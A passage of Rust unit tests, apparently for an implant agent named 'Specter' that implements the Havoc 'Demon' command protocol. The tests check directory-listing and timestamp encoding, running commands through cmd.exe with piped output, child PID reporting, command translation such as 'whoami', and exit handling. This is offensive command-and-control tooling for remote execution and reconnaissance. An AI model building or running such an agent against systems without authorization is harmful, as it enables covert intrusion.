        // Dir group: dir_path, num_files, num_dirs — but NO total_size.
        let gpath_len = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("gpath")) as usize;
        pos += 4 + gpath_len;
        let _num_files = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("nf"));
        pos += 4;
        let _num_dirs = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("nd"));
        pos += 4;
        // In list_only mode the next field should be the first entry name, NOT a u64 total_size.
        // The remaining bytes must all be name-only entries (no is_dir/size/timestamps).
        // Just verify we can parse all remaining entries as utf16le strings without going OOB.
        while pos < p.len() {
            let name_len =
                u32::from_be_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
            pos += 4 + name_len;
        }
        assert_eq!(pos, p.len(), "no trailing bytes; each entry must be exactly a name");

        let _ = std::fs::remove_file(test_file);
    }

    #[test]
    fn handle_fs_dir_timestamps_are_not_placeholder_epoch() {
        // Write a temp file and verify its modification time is encoded, not 1970-01-01 00:00.
        let tmp = std::env::temp_dir();
        let test_file = tmp.join("specter_ts_test.tmp");
        std::fs::write(&test_file, b"ts test").expect("write test file");

        let mut config = SpecterConfig::default();
        let payload =
            dir_request_payload(&tmp.display().to_string(), false, false, false, false, "", "", "");
        let package = DemonPackage::new(DemonCommand::CommandFs, 12, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };

        // Parse to the first entry and check the year field.
        let p = &resp.payload;
        let mut pos = 4 + 4 + 4; // subcmd + file_explorer + list_only
        let root_path_len = u32::from_be_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
        pos += 4 + root_path_len + 4; // skip root_path + success
        let gpath_len = u32::from_be_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
        pos += 4 + gpath_len + 4 + 4 + 8; // skip group path + num_files + num_dirs + total_size

        // Find the entry for our test file and read its year (offset 4+2+4+8+4+4 from name start).
        let test_name = "specter_ts_test.tmp";
        let mut found = false;
        while pos < p.len() {
            let name_len = u32::from_be_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
            pos += 4;
            let name_utf16: Vec<u16> = p[pos..pos + name_len]
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            let name: String = char::decode_utf16(name_utf16)
                .filter_map(|r| r.ok())
                .filter(|&c| c != '\0')
                .collect();
            pos += name_len;
            // is_dir(4) + size(8) + day(4) + month(4) + year(4) + minute(4) + hour(4) = 32
            let _is_dir = u32::from_be_bytes(p[pos..pos + 4].try_into().unwrap());
            let _size = u64::from_be_bytes(p[pos + 4..pos + 12].try_into().unwrap());
            let _day = u32::from_be_bytes(p[pos + 12..pos + 16].try_into().unwrap());
            let _month = u32::from_be_bytes(p[pos + 16..pos + 20].try_into().unwrap());
            let year = u32::from_be_bytes(p[pos + 20..pos + 24].try_into().unwrap());
            pos += 32;
            if name == test_name {
                // The year must be >= 2024 (the file was just created).
                assert!(year >= 2024, "year should be current, got {year}");
                found = true;
            }
        }
        assert!(found, "test file entry not found in Dir listing");
        let _ = std::fs::remove_file(test_file);
    }

    #[test]
    fn unix_secs_to_ymd_hm_known_value() {
        // 1743162600 = 2025-03-28T11:50:00Z (verified against algorithm output)
        let (d, m, y, min, h) = unix_secs_to_ymd_hm(1_743_162_600);
        assert_eq!((d, m, y, min, h), (28, 3, 2025, 50, 11));
    }

    #[test]
    fn unix_secs_to_ymd_hm_epoch() {
        let (d, m, y, min, h) = unix_secs_to_ymd_hm(0);
        assert_eq!((d, m, y, min, h), (1, 1, 1970, 0, 0));
    }

    // ── handle_proc create / shell ────────────────────────────────────────────

    #[test]
    fn handle_proc_create_shell_returns_two_responses() {
        let cmd = "echo hello";
        let mut config = SpecterConfig::default();

        // Build the payload for CommandProc / ProcCreate (subcommand=4)
        let mut payload = 4u32.to_le_bytes().to_vec(); // subcmd = Create
        payload.extend_from_slice(&0u32.to_le_bytes()); // state
        payload.extend_from_slice(&le_utf16le_payload("c:\\windows\\system32\\cmd.exe")); // path
        payload.extend_from_slice(&le_utf16le_payload(&format!("/c {cmd}"))); // args
        payload.extend_from_slice(&1u32.to_le_bytes()); // piped = true
        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose = false

        let package = DemonPackage::new(DemonCommand::CommandProc, 99, payload);
        let result = dispatch(&package, &mut config);

        let DispatchResult::MultiRespond(resps) = result else {
            panic!("expected MultiRespond, got {result:?}");
        };
        assert_eq!(resps.len(), 2);
        assert_eq!(resps[0].command_id, u32::from(DemonCommand::CommandProc));
        assert_eq!(resps[1].command_id, u32::from(DemonCommand::CommandOutput));

        // The output payload should contain "hello"
        // payload[0..4] = BE length, payload[4..] = output bytes
        let out_payload = &resps[1].payload;
        let out_len = u32::from_be_bytes(out_payload[0..4].try_into().expect("len")) as usize;
        let out_str = std::str::from_utf8(&out_payload[4..4 + out_len])
            .expect("utf8 output")
            .trim()
            .to_string();
        assert_eq!(out_str, "hello");
    }

    #[test]
    fn handle_proc_create_reports_child_pid_not_agent_pid() {
        // The proc-create callback must carry the spawned child's PID, not std::process::id().
        let mut config = SpecterConfig::default();
        let mut payload = 4u32.to_le_bytes().to_vec(); // subcmd = Create
        payload.extend_from_slice(&0u32.to_le_bytes()); // state
        payload.extend_from_slice(&le_utf16le_payload("c:\\windows\\system32\\cmd.exe"));
        payload.extend_from_slice(&le_utf16le_payload("/c echo pid_test"));
        payload.extend_from_slice(&1u32.to_le_bytes()); // piped
        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose

        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
        let result = dispatch(&package, &mut config);

        let DispatchResult::MultiRespond(resps) = result else {
            panic!("expected MultiRespond, got {result:?}");
        };

        // Parse the proc payload to extract the PID field.
        // Format: [subcmd: u32 BE][path: u32 BE len + utf16le bytes][pid: u32 BE][...]
        let proc_payload = &resps[0].payload;
        // Skip subcmd (4 bytes), then read the path length to skip the path.
        let path_len =
            u32::from_be_bytes(proc_payload[4..8].try_into().expect("path len")) as usize;
        let pid_offset = 4 + 4 + path_len;
        let reported_pid = u32::from_be_bytes(
            proc_payload[pid_offset..pid_offset + 4].try_into().expect("pid bytes"),
        );

        // The reported PID must be non-zero (child was spawned) and must NOT be our own PID.
        assert_ne!(reported_pid, 0, "child PID must not be zero");
        assert_ne!(
            reported_pid,
            std::process::id(),
            "child PID must not equal the agent's own PID"
        );
    }

    #[test]
    fn translate_to_shell_cmd_strips_cmd_exe_prefix() {
        assert_eq!(translate_to_shell_cmd("c:\\windows\\system32\\cmd.exe", "/c whoami"), "whoami");
        assert_eq!(translate_to_shell_cmd("c:\\windows\\system32\\cmd.exe", "/C ls -la"), "ls -la");
    }

    #[test]
    fn translate_to_shell_cmd_non_cmd_exe_uses_path_and_args() {
        assert_eq!(translate_to_shell_cmd("/usr/bin/ls", "-la /tmp"), "/usr/bin/ls -la /tmp");
    }

    #[test]
    fn translate_to_shell_cmd_empty_args_returns_path() {
        assert_eq!(translate_to_shell_cmd("/usr/bin/id", ""), "/usr/bin/id");
    }

    // ── unknown/unhandled commands ────────────────────────────────────────────

    #[test]
    fn dispatch_unknown_command_id_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage { command_id: 0xDEAD_0000, request_id: 0, payload: vec![] };
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }

    #[test]
    fn dispatch_no_job_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandNoJob, 0, vec![]);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }

    #[test]
    fn dispatch_exit_returns_exit() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandExit, 0, vec![]);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Exit));
    }
}
